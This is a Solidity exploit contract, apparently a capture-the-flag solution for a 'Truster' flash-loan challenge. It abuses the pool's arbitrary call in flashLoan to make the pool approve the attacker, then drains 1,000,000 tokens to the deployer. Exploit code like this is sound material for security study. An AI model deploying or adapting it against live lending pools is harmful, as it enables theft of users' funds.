// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackTruster {
    using Address for address;

    uint private constant amount = 1000000 ether;

    constructor(address target, address token) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );

        target.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                address(this),
                token,
                data
            )
        );

        token.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                target,
                address(this),
                amount
            )
        );

        token.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                msg.sender,
                amount
            )
        );
    }
}
